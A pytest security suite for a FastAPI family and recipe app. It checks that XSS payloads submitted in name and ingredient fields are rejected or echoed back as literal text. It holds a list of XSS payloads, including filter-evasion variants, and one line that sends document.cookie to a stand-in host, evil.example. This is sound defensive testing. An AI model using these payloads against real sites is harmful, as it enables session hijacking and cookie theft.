"""
Security tests for XSS (Cross-Site Scripting) payload handling.
Tests verify that XSS payloads submitted through API fields are either rejected
by Pydantic validation (422) or stored as literal strings and echoed back
without being executed or altered in a way that could enable script injection.
"""

import pytest
from fastapi.testclient import TestClient

# ---------------------------------------------------------------------------
# XSS payload catalogue
# ---------------------------------------------------------------------------

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img onerror=alert(1) src=x>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    '"><script>alert(document.cookie)</script>',
    "';alert(1)//",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<<SCRIPT>alert(1)//<</SCRIPT>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
    "<a href=javascript:void(0) onclick=alert(1)>click</a>",
    "expression(alert(1))",
    "<div style=\"background:url('javascript:alert(1)')\">",
    "<object data=javascript:alert(1)>",
]

# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------


def _assert_payload_handled(response, payload: str) -> None:
    """Assert payload is either rejected (422) or returned as literal text (200/201)."""
    if response.status_code == 422:
        return
    assert response.status_code in (200, 201), (
        f"Unexpected status {response.status_code} for payload: {payload!r}"
    )
    body = response.text
    # Case-insensitive check: payload may be stored with different casing
    assert "<script>" not in body.lower() or payload.lower() in body.lower(), (
        f"Response may have rendered XSS payload: {payload!r}"
    )


# ---------------------------------------------------------------------------
# Family name XSS tests
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", XSS_PAYLOADS[:10])
def test_xss_in_family_name_on_create(test_client: TestClient, payload: str):
    """Test that XSS payloads in family name are rejected or returned as literal strings on creation."""
    response = test_client.post(
        "/api/v1/families",
        json={
            "name": payload,
            "family_size": 3,
            "password": "TestPass1",
        },
    )
    _assert_payload_handled(response, payload)


@pytest.mark.parametrize("payload", XSS_PAYLOADS[10:])
def test_xss_in_family_name_on_update(
    test_client: TestClient, family_factory, test_db, payload: str
):
    """Test that XSS payloads in family name are rejected or returned as literal strings on update."""
    family, token = family_factory(test_db)

    response = test_client.put(
        f"/api/v1/families/{family.id}",
        json={"name": payload},
        headers={"Authorization": f"Bearer {token}"},
    )
    _assert_payload_handled(response, payload)


# ---------------------------------------------------------------------------
# User name XSS tests
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", XSS_PAYLOADS[:10])
def test_xss_in_user_name_on_create(test_client: TestClient, family_factory, test_db, payload: str):
    """Test that XSS payloads in user name are rejected or stored as literal strings on creation."""
    family, token = family_factory(test_db)

    response = test_client.post(
        "/api/v1/users",
        json={"name": payload},
        headers={"Authorization": f"Bearer {token}"},
    )
    _assert_payload_handled(response, payload)


@pytest.mark.parametrize("payload", XSS_PAYLOADS[10:])
def test_xss_in_user_name_additional_payloads(
    test_client: TestClient, family_factory, test_db, payload: str
):
    """Test that additional XSS payloads in user name are handled safely."""
    family, token = family_factory(test_db)

    response = test_client.post(
        "/api/v1/users",
        json={"name": payload},
        headers={"Authorization": f"Bearer {token}"},
    )
    _assert_payload_handled(response, payload)


# ---------------------------------------------------------------------------
# Ingredient text XSS tests
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("payload", XSS_PAYLOADS[:10])
def test_xss_in_ingredient_text(
    test_client: TestClient, family_factory, user_factory, test_db, payload: str
):
    """Test that XSS payloads in ingredient text are rejected or stored as literal strings."""
    family, token = family_factory(test_db)
    user = user_factory(test_db, family_id=family.id)

    response = test_client.put(
        f"/api/v1/users/{user.id}/ingredients",
        json={"ingredients": [payload]},
        headers={"Authorization": f"Bearer {token}"},
    )
    _assert_payload_handled(response, payload)


@pytest.mark.parametrize("payload", XSS_PAYLOADS[10:])
def test_xss_in_ingredient_text_additional_payloads(
    test_client: TestClient, family_factory, user_factory, test_db, payload: str
):
    """Test that additional XSS payloads in ingredient text are handled safely."""
    family, token = family_factory(test_db)
    user = user_factory(test_db, family_id=family.id)

    response = test_client.put(
        f"/api/v1/users/{user.id}/ingredients",
        json={"ingredients": [payload]},
        headers={"Authorization": f"Bearer {token}"},
    )
    _assert_payload_handled(response, payload)


# ---------------------------------------------------------------------------
# Spot-check: stored literal value verification
# ---------------------------------------------------------------------------


def test_basic_script_tag_stored_as_literal_or_rejected(
    test_client: TestClient, family_factory, test_db
):
    """Verify that a basic script tag is either rejected or echoed back as a literal, safe string."""
    payload = "<script>alert('xss')</script>"
    family, token = family_factory(test_db)

    response = test_client.post(
        "/api/v1/users",
        json={"name": payload},
        headers={"Authorization": f"Bearer {token}"},
    )
    if response.status_code in (200, 201):
        data = response.json()
        stored_name = data.get("name", "")
        assert stored_name == payload or len(stored_name) == 0, (
            f"Expected literal payload or empty, got: {stored_name!r}"
        )
    else:
        assert response.status_code == 422


def test_onerror_attribute_stored_as_literal_or_rejected(
    test_client: TestClient, family_factory, test_db
):
    """Verify that an onerror event attribute in input is either rejected or stored as literal text."""
    payload = "<img onerror=alert(document.cookie) src=x>"
    response = test_client.post(
        "/api/v1/families",
        json={
            "name": payload,
            "family_size": 2,
            "password": "TestPass1",
        },
    )
    if response.status_code in (200, 201):
        data = response.json()
        assert data.get("name") == payload
    else:
        assert response.status_code == 422


def test_javascript_protocol_in_user_name_handled_safely(
    test_client: TestClient, family_factory, test_db
):
    """Verify that a javascript: protocol string in user name is rejected or stored as literal."""
    family, token = family_factory(test_db)
    payload = "javascript:alert(document.domain)"

    response = test_client.post(
        "/api/v1/users",
        json={"name": payload},
        headers={"Authorization": f"Bearer {token}"},
    )
    _assert_payload_handled(response, payload)


def test_svg_onload_in_ingredient_handled_safely(
    test_client: TestClient, family_factory, user_factory, test_db
):
    """Verify that an SVG onload payload in ingredient text is handled safely."""
    family, token = family_factory(test_db)
    user = user_factory(test_db, family_id=family.id)
    payload = "<svg onload=fetch('https://evil.example/steal?c='+document.cookie)>"

    response = test_client.put(
        f"/api/v1/users/{user.id}/ingredients",
        json={"ingredients": [payload]},
        headers={"Authorization": f"Bearer {token}"},
    )
    _assert_payload_handled(response, payload)
